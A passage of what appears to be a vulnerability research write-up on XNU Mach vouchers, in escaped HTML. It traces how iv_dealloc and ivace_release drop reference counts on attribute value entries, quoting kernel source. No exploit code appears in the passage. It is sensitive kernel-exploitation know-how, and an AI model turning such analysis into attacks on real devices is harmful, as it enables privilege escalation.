&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; ivace_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_refs &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_value &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;pointer to user_data_value_element&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_value_element &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; e_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; e_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0x41&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0x41&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0x41&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0x41&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c10"&gt;Let&amp;#39;s look at what happens when we drop the only send right to the voucher port and the voucher gets deallocated.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;We&amp;#39;ll skip analysis of the mach port part; essentially, once all the send rights to the mach port holding a reference to the voucher are deallocated &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;will get called to drop its reference on the voucher. And if that was the last reference &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_release&lt;/span&gt;&lt;span&gt;&amp;nbsp;calls &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dealloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;and we&amp;#39;ll pick up the code there:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.4b28abaa66e9cfb4075064152109c5280c8cf0e2"&gt;&lt;/a&gt;&lt;a id="t.40"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_dealloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;boolean_t unhash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_dealloc&lt;/span&gt;&lt;span&gt;&amp;nbsp;removes the voucher from the hash table, destroys the mach port associated with the voucher (if there was one) then releases a reference on each value index in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.4f3ea1be5aeabd748f89b7dfdb88c89a35820b48"&gt;&lt;/a&gt;&lt;a id="t.41"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;for&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;i &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;i&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;iv_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;i&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;Recall that the index in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the &amp;quot;key index&amp;quot;, which is one less than the key, which is why &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;i&lt;/span&gt;&lt;span&gt;&amp;nbsp;is being passed to &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_release&lt;/span&gt;&lt;span&gt;. The value in &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;alone is meaningless without knowing under which index it was stored in the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;iv_table&lt;/span&gt;&lt;span&gt;. Here&amp;#39;s the start of &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3340385800b70e69984ecec61cc53f34e8b57d23"&gt;&lt;/a&gt;&lt;a id="t.42"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;void&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_release&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgt_lookup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivam&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value_index &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac_table&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;];&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* cant release persistent values */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_persist&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;--&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivace_refs&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;ivac&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;First they grab references to the attribute manager and controller for the given key index (&lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivam&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;), take the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;nbsp;lock then take calculate a pointer into the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;to get a pointer to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;corresponding to the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;value_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;to be released.&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5"&gt;&lt;span&gt;If this entry is marked as persistent, then nothing happens, otherwise the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;field is decremented. If the reference count is still non-zero, they drop the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac&lt;/span&gt;&lt;span&gt;&amp;#39;s lock and return. Otherwise, the reference count of this &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;has gone to zero and they will continue on to &amp;quot;free&amp;quot; the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;. As noted before, this isn&amp;#39;t going to free the &lt;/span&gt;&lt;span class="BGLtzooHlW-c11"&gt;ivac_entry&lt;/span&gt;&lt;span class="BGLtzooHlW-c10"&gt;&amp;nbsp;to the zone allocator; the entry is just an entry in an array and in its free state its index is present in a freelist of empty indexes. The code continues thus:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.3548b2c452dd7eb3579b0290670f339199044845"&gt;&lt;/a&gt;&lt;a id="t.43"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; key &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;iv_index_to_key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;key_index&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;MACH_VOUCHER_ATTR_KEY_NONE &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/*&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c7"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* if last return reply is still 